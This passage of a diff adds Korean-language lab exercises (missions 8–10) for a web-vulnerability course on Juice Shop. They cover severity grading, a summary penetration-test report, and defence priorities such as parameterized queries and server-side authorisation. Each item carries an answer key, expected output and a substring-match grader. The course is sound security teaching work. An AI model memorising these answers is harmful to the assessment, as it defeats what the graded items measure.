+      - **Low**: 보안 헤더 누락, 핑거프린팅 — 단독 위험은 낮으나 보고 대상.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ```bash
+      # 1) Critical — 권한·시스템을 통째로 내주는 발견
+      echo "Critical: 인증우회(로그인 SQLi), RCE(명령주입)"
+      # 2) High — 영향 크고 악용 쉬움
+      echo "High: A01 무인증 관리 엔드포인트, Stored XSS"
+      # 3) Medium — 정보 노출·세션
+      echo "Medium: 정보 노출(/ftp), 세션 쿠키 플래그 누락"
+      # 4) Low — 단독 위험 낮으나 보고 대상
+      echo "Low: 보안 헤더 누락, 핑거프린팅"
+      # 5) 결론 — CVSS 기반 우선순위화
+      # → CVSS 기반 우선순위화
+      ```
+
+      ## ✅ 합격 기준
+      `Critical` 출력 시 통과. **근거:** 발견이 Critical~Low 로 분류되어 등급마다 근거가 분명하면
+      수정 우선순위(Critical 즉시 ~ Low 계획적)의 근거가 선다.
+    hint: 'Critical/High/Medium/Low'
+    category: analysis
+    points: 8
+    answer: |
+      # 1) Critical — 권한·시스템을 통째로 내주는 발견
+      echo "Critical: 인증우회(로그인 SQLi), RCE(명령주입)"
+      # 2) High — 영향 크고 악용 쉬움
+      echo "High: A01 무인증 관리 엔드포인트, Stored XSS"
+      # 3) Medium — 정보 노출·세션
+      echo "Medium: 정보 노출(/ftp), 세션 쿠키 플래그 누락"
+      # 4) Low — 단독 위험 낮으나 보고 대상
+      echo "Low: 보안 헤더 누락, 핑거프린팅"
+      # 5) 결론 — CVSS 기반 우선순위화
+      # → CVSS 기반 우선순위화
+    answer_detail: "심각도 평가(CVSS 기반) = 발견을 Critical~Low 로 분류해 수정 우선순위의 근거를 만든다. 인증 우회(SQLi)·RCE=Critical, A01 무인증 관리·Stored XSS=High, 정보 노출(/ftp)·JWT payload·세션=Medium, 헤더 누락·핑거프린팅=Low. 출력에 Critical 이 보이면 등급 분류 성공 — Critical 은 즉시, Low 는 계획적으로 처리한다."
+    expected_output: |
+      Critical: 인증우회(로그인 SQLi), RCE(명령주입)
+      High: A01 무인증 관리 엔드포인트, Stored XSS
+      Medium: 정보 노출(/ftp), 세션 쿠키 플래그 누락
+      Low: 보안 헤더 누락, 핑거프린팅
+      → CVSS 기반 우선순위화
+    verify:
+      type: output_contains
+      expect: 'Critical'
+      field: stdout
+      semantic: {intent: "심각도 평가", success_criteria: ["등급 분류"], acceptable_methods: ["**[관리적] 심각도 (권장)**"]}
+    target_vm: web
+
+  - order: 9
+    instruction: |
+      ## 🎯 목표
+      미션 1–8 의 발견을 **발견 → 증거 → 심각도 → 권고** 구조의 한 문서로 종합한다 — 점검의 최종
+      산출물인 침투 테스트 보고서를 작성한다.
+
+      ## 📖 개념 한 줄
+      점검의 가치는 보고서에서 완성된다. 흩어진 발견을 **심각도순**으로 정리하고, 각 발견에 재현
+      가능한 **증거**(응답 코드·JWT payload·WAF 룰 번호)와 **권고**를 붙여야 의뢰인이 행동할 수 있다.
+
+      ## 🧩 보고서 표준 구조
+      개요 → 발견 상세(심각도순) → 각 발견의 증거 → 권고 → 결론. 본 시험의 발견은 대략
+      Critical(로그인 SQLi 인증 우회) → High(A01 무인증 관리·입력 취약점) → Medium(강제 브라우징·JWT
+      payload 노출) → Low(HTTP 메서드·보안 헤더) 순으로 정렬된다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ```bash
+      # 1) heredoc(<<'EOF' ... EOF)으로 종합 점검 보고서를 심각도순으로 출력 — 발견→증거→권고→결론
+      cat > ~/web-vuln_w08_note1.md <<'EOF'
+      # 웹취약점 W08 JuiceShop 종합 점검 보고서
+      ## Critical: 로그인 SQLi 인증우회(admin JWT 탈취)
+      ## High: A01 무인증 관리(admin-config), 입력 취약점(SQLi/XSS)
+      ## Medium: 강제 브라우징(/ftp), JWT payload 노출, 세션 쿠키
+      ## Low: HTTP 메서드/보안 헤더
+      ## 권고: parameterized query, 서버측 인가, 보안 헤더/CSP, 정보 노출 축소
+      ## 결론: WSTG 종합 점검으로 인증~정보노출까지 식별. 다층 방어 권고
+      EOF
+      cat ~/web-vuln_w08_note1.md
+      ```
+
+      ## ✅ 합격 기준
+      `Critical` 출력 시 통과. **근거:** 보고서에 심각도순 발견 + 증거 + 권고 + 결론(Critical 항목 포함)이
+      담기면 점검의 최종 산출물(침투 테스트 보고서)로 인정된다.
+    hint: '발견 취약점 종합'
+    category: report
+    points: 10
+    answer: |
+      cat > ~/web-vuln_w08_note2.md <<'EOF'
+      # 웹취약점 W08 JuiceShop 종합 점검 보고서
+      ## Critical: 로그인 SQLi 인증우회(admin JWT 탈취)
+      ## High: A01 무인증 관리(admin-config), 입력 취약점(SQLi/XSS)
+      ## Medium: 강제 브라우징(/ftp), JWT payload 노출, 세션 쿠키
+      ## Low: HTTP 메서드/보안 헤더
+      ## 권고: parameterized query, 서버측 인가, 보안 헤더/CSP, 정보 노출 축소
+      ## 결론: WSTG 종합 점검으로 인증~정보노출까지 식별. 다층 방어 권고
+      EOF
+      cat ~/web-vuln_w08_note2.md
+    answer_detail: "종합 점검 보고서 = WSTG 전 영역의 발견을 심각도순으로 정리하고 각각에 증거+권고를 붙인 침투 테스트 보고서(개요→발견 상세→증거→권고→결론). Critical(로그인 SQLi 인증 우회)부터 Low(헤더)까지 + 권고 + 다층 방어 결론이 포함되면 합격 — 점검의 최종 산출물이자 의뢰인·감사 제출물이다."
+    expected_output: |
+      # 웹취약점 W08 JuiceShop 종합 점검 보고서
+      ## Critical: 로그인 SQLi 인증우회(admin JWT 탈취)
+      ## High: A01 무인증 관리(admin-config), 입력 취약점(SQLi/XSS)
+      ## Medium: 강제 브라우징(/ftp), JWT payload 노출, 세션 쿠키
+      ## Low: HTTP 메서드/보안 헤더
+      ## 권고: parameterized query, 서버측 인가, 보안 헤더/CSP, 정보 노출 축소
+      ## 결론: WSTG 종합 점검으로 인증~정보노출까지 식별. 다층 방어 권고
+    verify:
+      type: output_contains
+      expect: 'Critical'
+      field: stdout
+      semantic: {intent: "종합 점검 보고", success_criteria: ["발견/심각도/권고"], acceptable_methods: ["**[관리적] 종합 보고서 (권장)**"]}
+    target_vm: web
+
+  - order: 10
+    instruction: |
+      ## 🎯 목표
+      발견을 **심각도순 방어 우선순위**로 묶어, 의뢰인이 무엇부터 고쳐야 하는지를 제시한다 — 보고서의
+      마지막 장.
+
+      ## 📖 개념 한 줄
+      보고서의 실질적 가치는 "고치는 길"에 있다. 발견을 심각도순으로 정렬하고 각 영역의 **근본 방어**를
+      제시해, 의뢰인의 보안 로드맵으로 이어지게 한다(Critical 부터).
+
+      ## 🧩 영역별 근본 방어
+      - **① 인증**: parameterized query(SQLi 인증 우회 차단) + rate-limit/MFA.
+      - **② 접근제어**: 서버측 인가 검사(클라이언트 숨김에 의존 금지, A01).
+      - **③ 입력**: 검증/allowlist(SQLi/XSS/RCE) — WAF 는 임시 완화이고 이것이 근본.
+      - **④ 정보 노출 축소 + 세션 보안**: /ftp 등 노출 제거, JWT 에 민감정보 미포함, 쿠키 플래그.
+      - **⑤ 보안 헤더/CSP**: 누락 헤더 추가로 XSS·클릭재킹 완화.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ```bash
+      # 1) 방어 우선순위 — 인증 최우선(parameterized query+MFA)
+      echo "방어 우선순위 ① 인증: parameterized query(SQLi 우회 차단) + rate-limit/MFA"
+      # 2) 접근제어 — 서버측 인가 검사(A01)
+      echo "② 접근제어: 서버측 인가 검사(A01)"
+      # 3) 입력 — 검증/allowlist(SQLi/XSS/RCE)
+      echo "③ 입력: 검증/allowlist(SQLi/XSS/RCE)"
+      # 4) 정보 노출 축소 + 세션 보안
+      echo "④ 정보 노출 축소 + 세션 보안"
+      # 5) 보안 헤더/CSP
+      echo "⑤ 보안 헤더/CSP"
+      # 6) 결론 — Critical(인증/접근제어)부터
+      # → Critical부터: 인증/접근제어 우선
+      ```
+
+      ## ✅ 합격 기준
+      `우선순위` 출력 시 통과. **근거:** 방어 우선순위가 Critical(인증/접근제어)부터 정렬되고 각 항목에
+      근본 방어가 붙으면 의뢰인의 보안 로드맵으로 이어지는 권고가 된다.
+    hint: '방어 우선순위'
+    category: report
+    points: 8
+    answer: |
+      # 1) 방어 우선순위 — 인증 최우선(parameterized query+MFA)
+      echo "방어 우선순위 ① 인증: parameterized query(SQLi 우회 차단) + rate-limit/MFA"
+      # 2) 접근제어 — 서버측 인가 검사(A01)
+      echo "② 접근제어: 서버측 인가 검사(A01)"
+      # 3) 입력 — 검증/allowlist(SQLi/XSS/RCE)
+      echo "③ 입력: 검증/allowlist(SQLi/XSS/RCE)"
+      # 4) 정보 노출 축소 + 세션 보안
+      echo "④ 정보 노출 축소 + 세션 보안"
+      # 5) 보안 헤더/CSP
+      echo "⑤ 보안 헤더/CSP"
+      # 6) 결론 — Critical(인증/접근제어)부터
+      # → Critical부터: 인증/접근제어 우선
+    answer_detail: "권고(보고서 마지막 장) = 발견을 심각도순 방어 우선순위로 묶어 각 영역의 근본 방어를 제시한다 — ①인증(parameterized query+MFA) ②접근제어(서버측 인가) ③입력 검증/allowlist ④정보 노출 축소·세션 보안 ⑤보안 헤더/CSP. Critical(인증/접근제어)부터 처리하며, WAF 는 임시 완화일 뿐 근본은 앱 수정임을 명시한다."
+    expected_output: |
+      방어 우선순위 ① 인증: parameterized query(SQLi 우회 차단) + rate-limit/MFA
+      ② 접근제어: 서버측 인가 검사(A01)
+      ③ 입력: 검증/allowlist(SQLi/XSS/RCE)
+      ④ 정보 노출 축소 + 세션 보안
+      ⑤ 보안 헤더/CSP
+      → Critical부터: 인증/접근제어 우선
+    verify:
+      type: output_contains
+      expect: '우선순위'
+      field: stdout
+      semantic: {intent: "방어 우선순위 권고", success_criteria: ["우선순위"], acceptable_methods: ["**[관리적] 권고 (권장)**"]}
+    target_vm: web
